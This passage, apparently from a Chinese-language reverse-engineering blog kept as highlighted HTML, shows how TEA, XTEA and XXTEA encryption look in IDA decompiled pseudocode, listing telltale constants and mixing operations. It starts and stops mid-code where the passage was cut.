class="token punctuation">.</span>value<span class="token operator">=</span>v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>sum1<span class="token punctuation">.</span>value<span class="token operator">-=</span>deltarounds<span class="token operator">-=</span><span class="token number">1</span> <span class="token keyword">return</span> v    <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>delta<span class="token operator">=</span><span class="token number">0x9e3779b9</span>n<span class="token operator">=</span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密前数据:"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>res<span class="token operator">=</span>btea<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span>res<span class="token operator">=</span>btea<span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token operator">-</span>n<span class="token punctuation">,</span>delta<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后数据:"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="tea算法在ida中的分析与识别"><a class="markdownIt-Anchor" href="#tea算法在ida中的分析与识别"></a> TEA算法在ida中的分析与识别</h1><ul><li>可能存在针对64bit以及128bit数字的操作(输入的message和key)</li><li>存在先位移，后异或的类似操作。比如((z &gt;&gt; 5 ^ x &lt;&lt;4) ^ (y &lt;&lt; 4 &amp; q &gt;&gt; 5))等混合变换</li><li>全部你一个复杂的混合变换的结构可能会叠加到另一个值上，两者相互叠加(Feistel结构)</li><li>获取密钥的时候，会使用某一个常量值作为下标 (key [ (sum &gt;&gt; 11) &amp; 3])</li><li>一开始会在算法定义一个delta，并且不断参与算法，但是不会受到输入的影响。</li></ul><p>源码在上面已经给出:</p><ul><li>Debug32位，Vs2022</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//IDAmain函数</span><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-28h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-10h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-Ch]</span>  <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C028<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B30<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_411186</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B4C<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110FF</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B68<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>sub_4110CDprintf函数</li><li>sub_411186为Tea_encrypt函数</li><li>sub_4110FF为Tea_decrypt函数</li></ul><p>sub_411186函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// attributes: thunk</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_411186</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_4118D0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_4118D0</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-2Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+E8h] [ebp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+100h] [ebp-8h]</span>  <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C028<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token operator">*</span>a2<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v4 <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">-=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>    v5 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> v6<span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>1640531527为我们xtea算法中的Delta常数</li><li>xtea算法与tea算法不同的是xtea算法的核心算法是在于取轮密钥，而不是像tea算法中，通过常数影响轮密钥</li><li>(v5 + ((v5 &gt;&gt; 5) ^ ( 16 * v5))) 等价于 (v1 + ((v1 &gt;&gt; 5) ^ (v1 &lt;&lt; 4)))其他同理.</li></ul><p>XXTEA算法:</p><ul><li>Debug32位，Vs2022</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//main函数代码</span><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-28h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+F4h] [ebp-10h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-Ch]</span>  <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C029<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B30<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4111E0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B4C<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4111E0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v5<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4110CD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>byte_417B68<span class="token punctuation">,</span> v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>sub_4110CD对应printf函数</li><li>sub_4111E0对应的是Tea_encrypt和Tea_decrypt函数</li></ul><p>sub_4111E0函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// attributes: thunk</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_4111E0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_411770</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_411770</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-44h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+D4h] [ebp-44h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+E0h] [ebp-38h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [esp+E0h] [ebp-38h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-2Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+ECh] [ebp-2Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [esp+F8h] [ebp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// [esp+104h] [ebp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// [esp+110h] [ebp-8h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// [esp+124h] [ebp+Ch]</span>  result <span class="token operator">=</span> <span class="token function">__CheckForDebuggerJustMyCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_41C029<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v19 <span class="token operator">=</span> <span class="token operator">-</span>a2<span class="token punctuation">;</span>      v12 <span class="token operator">=</span> <span class="token number">52</span> <span class="token operator">/</span> v19 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>      v16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1640531527</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">52</span> <span class="token operator">/</span> v19 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v18 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>      <span class="token keyword">do</span>      <span class="token punctuation">&#123;</span>        v10 <span class="token operator">=</span> <span class="token punctuation">(</span>v16 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v7 <span class="token operator">=</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>             <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v10 <span class="token operator">^</span> i <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v18 <span class="token operator">^</span> v16<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v18 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                                   <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v18<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          v18 <span class="token operator">=</span> v7<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        v8 <span class="token operator">=</span> <span class="token operator">*</span>a1           <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v10<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v18 <span class="token operator">^</span> v16<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v18 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                         <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v18<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v19 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span>a1 <span class="token operator">=</span> v8<span class="token punctuation">;</span>        v18 <span class="token operator">=</span> v8<span class="token punctuation">;</span>        v16 <span class="token operator">+=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token operator">--</span>v12<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    v11 <span class="token operator">=</span> <span class="token number">52</span> <span class="token operator">/</span> a2 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v17 <span class="token operator">=</span> a1<span class="token punctuation">[</span>a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v15 <span class="token operator">-=</span> <span class="token number">0x61C88647</span><span class="token punctuation">;</span>      v9 <span class="token operator">=</span> <span class="token punctuation">(</span>v15 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> a2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v17 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v9 <span class="token operator">^</span> j <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> v15<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v17<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                               <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v17 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v4 <span class="token operator">+</span> v5<span class="token punctuation">;</span>        v17 <span class="token operator">=</span> v4 <span class="token operator">+</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v17 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v9 <span class="token operator">^</span> j <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">*</span>a1 <span class="token operator">^</span> v15<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span 